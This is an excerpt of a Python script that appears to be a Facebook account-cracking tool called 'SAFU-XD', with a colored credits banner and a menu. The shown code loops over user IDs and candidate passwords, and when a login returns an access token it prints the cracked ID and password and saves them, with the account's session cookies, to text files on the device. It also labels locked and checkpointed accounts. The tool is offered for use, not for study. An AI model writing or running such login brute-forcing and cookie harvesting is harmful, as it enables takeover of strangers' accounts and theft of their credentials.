...
\033[1;91m▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬                              
\033[1;31m[\033[1;32m•\033[1;31m]\33[1;32m TEAM & 𝐂𝐄𝐎   : SAFWAN ISLAM 
\033[1;31m[\033[1;32m•\033[1;31m]\33[1;32m 𝐉𝐀𝐕𝐀 & 𝐂𝐄𝐎   : SAFWAN-ISLAM
\033[1;31m[\033[1;32m•\033[1;31m]\33[1;32m TOOL VIRSION : \033[1;35m1.1                   
\033[1;91m▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬                              
""")
...
def menu():
    ...
    if sex in ['1']:
        ...
        os.system('https://www.facebook.com/profile.php?id=100028392141273');menu()
    elif sex in ['0']:
        sys.exit()
    else:
        menu()
...
def file():
    clear()
    print(f'{G1}[{A}≈{G1}]{G1} EXAMPLE {A}➢{G1} /{A}sdcard{G1}/{A}SAFU.txt');linex()
...
def randm(ids,psd):
    ...
    sys.stdout.write(f'\r\r{A}[{G1}SAFU-XD{A}]-[{G1}{loop}{A}]-[{G1}OK{A}:{G1}{len(ok)}{A}] ')
    sys.stdout.flush()
    try:
        for pas in psd:
            ...
            if 'access_token' in q:
                ...
                if res == 'LIVE':
                	print(f'\r\r{A}[{G1}SAFU-OK{A}]{G1} {uid} {A}|{G1} {pas}');open('/sdcard/JAVA-RNDM-OK.txt','a').write(uid+'|'+pas+'|'+coki+'\n');ok.append(uid);break
                if res == 'LOCK':
                	print(f'\r\r{A}[{S} SAFU-XD{A}]{S} {uid} {A}|{S} {pas}');break
            else:continue
        loop+=1
    except Exception as e:
        pass
    ...
    try:
        ...
        for pw in psd:
            ...
            if 'access_token' in po:
                print(f'\r\r{A}[{G1}SAFU-OK{A}]{G1} {ids} {A}|{G1} {pas}')
                coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                open('/sdcard/SAFU-FILE-OK.txt','a').write(uid+'|'+pas+'|'+coki+'\n')
                ok.append(ids)
                break
            elif 'www.facebook.com' in po['error']['message']:
                print(f'\r\r{A}[{M} SAFU-CP{A}]{M} {ids} {A}|{M} {pas}')
